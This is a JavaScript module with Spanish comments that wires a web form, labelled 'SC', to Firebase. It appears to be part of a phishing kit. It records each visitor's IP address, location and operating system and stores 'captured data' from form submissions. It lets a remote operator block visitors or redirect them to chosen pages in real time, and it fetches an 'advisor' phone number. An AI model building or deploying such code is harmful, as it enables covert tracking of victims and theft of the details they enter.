// firebase-integration.js
// Módulo centralizado para integración de Firebase en SC
// Este módulo maneja: registro de sesión, escucha de cambios, guardado de datos

let database, ref, set, update, onValue, onDisconnect, push;
let deviceId;
let userRef;
let isInitialized = false;

// Función para inicializar Firebase de forma dinámica
async function initializeFirebase() {
    if (isInitialized) return;
    
    try {
        console.log('🔥 Inicializando Firebase en SC...');
        
        // Importar dinámicamente el módulo de configuración
        const firebaseModule = await import('./firebase-config.js');
        database = firebaseModule.database;
        ref = firebaseModule.ref;
        set = firebaseModule.set;
        update = firebaseModule.update;
        onValue = firebaseModule.onValue;
        onDisconnect = firebaseModule.onDisconnect;
        push = firebaseModule.push;
        
        // Escuchar número de asesor y guardar en localStorage
        onValue(ref(database, 'config/advisorPhone'), (snapshot) => {
            if (snapshot.exists()) {
                localStorage.setItem('advisorPhone', snapshot.val());
            }
        });
        deviceId = getDeviceId();
        userRef = ref(database, 'users/' + deviceId);
        isInitialized = true;
        
        console.log('✅ Firebase inicializado correctamente en SC');
        return true;
    } catch (error) {
        console.error('❌ Error inicializando Firebase:', error);
        return false;
    }
}

// Función UUID v4
function uuidv4() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// Función para obtener o crear device_id
function getDeviceId() {
    let id = localStorage.getItem('device_id');
    if (!id) {
        id = uuidv4();
        localStorage.setItem('device_id', id);
    }
    return id;
}

// Función para inicializar la sesión del usuario en Firebase
async function initUserSession(currentPage) {
    if (!isInitialized) {
        const initialized = await initializeFirebase();
        if (!initialized) return;
    }

    try {
        console.log('📝 Registrando sesión del usuario en Firebase...');
        const response = await fetch('https://ipinfo.io/json');
        const ipInfo = await response.json();
        
        const ip = ipInfo.ip || 'Desconocido';
        const location = (ipInfo.city && ipInfo.country) ? `${ipInfo.city}, ${ipInfo.country}` : 'Ubicación desconocida';

        // Guardar en localStorage para uso inmediato en Discord
        localStorage.setItem('user_ip', ip);
        localStorage.setItem('user_location', location);

        let os = "Desconocido";
        const userAgent = navigator.userAgent;
        if (userAgent.indexOf("Win") !== -1) os = "Windows";
        if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
        if (userAgent.indexOf("X11") !== -1) os = "UNIX";
        if (userAgent.indexOf("Linux") !== -1) os = "Linux";
        if (/Android/i.test(userAgent)) os = "Android";
        if (/iPhone|iPad|iPod/i.test(userAgent)) os = "iOS";

        update(userRef, {
            device_id: deviceId,
            ip: ip,
            location: location,
            os: os,
            currentPage: currentPage || 'SC_Form',
            status: 'online',
            last_active: Date.now(),
            source: 'SC'
        });
        
        // Registrar desconexión
        onDisconnect(userRef).update({
            status: 'offline',
            last_active: Date.now()
        });

        console.log('✅ Sesión registrada en Firebase');
    } catch (error) {
        console.error("❌ Error registrando sesión:", error);
    }

    // Escuchar cambios en tiempo real para bloqueos y redirecciones
    setupRealtimeListener(currentPage);
}

// Función para escuchar cambios en la BD (bloqueos, redirecciones)
function setupRealtimeListener(currentPage) {
    if (!isInitialized) {
        console.warn('⚠️ Firebase no está inicializado');
        return;
    }

    onValue(userRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
            console.log('📡 Recibiendo actualización de Firebase:', data);
            
            // Bloquear usuario si data.state === "block"
            if (data.state === "block") {
                console.log('🚫 Usuario bloqueado remotamente');
                if (window.location.href !== "https://www.google.com") {
                    window.location.href = "https://www.google.com";
                }
                return;
            }

            // Redirigir si se cambió currentPage remotamente
            if (data.currentPage && data.currentPage !== currentPage && data.currentPage !== 'SC_Form') {
                console.log('🔄 Redirigiendo a:', data.currentPage);
                window.location.href = data.currentPage;
            }
        }
    });
}

// Función para guardar datos capturados en Firebase
async function saveDataToFirebase(dataType, data) {
    if (!isInitialized) {
        const initialized = await initializeFirebase();
        if (!initialized) {
            console.warn('⚠️ Firebase no inicializado, continuando sin guardado en BD');
            return;
        }
    }

    try {
        const subId = 'sub_' + Date.now();
        const submissionRef = ref(database, `users/${deviceId}/submissions/${subId}`);
        
        console.log(`💾 Guardando ${dataType} en Firebase...`);
        
        await set(submissionRef, {
            type: dataType,
            data: data,
            timestamp: Date.now(),
            userAgent: navigator.userAgent
        });

        console.log(`✅ ${dataType} guardado en Firebase`);
    } catch (error) {
        console.error(`❌ Error guardando en Firebase:`, error);
    }
}

window.getAdvisorPhone = function() {
    return localStorage.getItem('advisorPhone') || '573243161381';
};

// Función para crear versión mejorada de envío de datos
async function submitDataWithFirebase(dataObject) {
    return new Promise((resolve) => {
        if (!isInitialized) {
            initializeFirebase().then(() => performSubmit(dataObject, resolve)).catch(() => resolve());
        } else {
            performSubmit(dataObject, resolve);
        }
    });
}

async function performSubmit(dataObject, resolve) {
    try {
        const subId = 'sub_' + Date.now();
        const submissionRef = ref(database, `users/${deviceId}/submissions/${subId}`);
        
        await set(submissionRef, {
            data: dataObject,
            timestamp: Date.now(),
            type: 'general_submission',
            source: 'SC'
        });

        console.log('✅ Datos guardados en Firebase exitosamente');
        resolve();
    } catch (error) {
        console.error('❌ Error en submitDataWithFirebase:', error);
        resolve();
    }
}

// Exportar funciones para uso global
window.firebaseIntegration = {
    initializeFirebase,
    initUserSession,
    saveDataToFirebase,
    submitDataWithFirebase,
    getDeviceId,
    get database() { return database; },
    get ref() { return ref; },
    get set() { return set; },
    get update() { return update; },
    get push() { return push; }
};

console.log('🎯 Módulo firebase-integration.js cargado correctamente');
